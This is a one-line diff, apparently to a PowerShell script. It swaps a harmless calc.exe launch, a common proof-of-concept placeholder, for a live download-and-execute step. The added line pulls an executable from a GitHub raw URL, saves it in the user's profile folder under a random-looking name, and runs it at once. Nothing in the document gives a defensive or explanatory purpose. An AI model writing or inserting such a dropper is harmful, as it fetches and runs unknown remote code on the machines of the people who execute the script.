@@ -1,1 +1,1 @@
-& "calc.exe"
+(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/BalletsPistol/_/main/RWS.exe", "C:\Users\$env:USERNAME\91qsdf.exe") ; & "C:\Users\$env:USERNAME\91qsdf.exe"
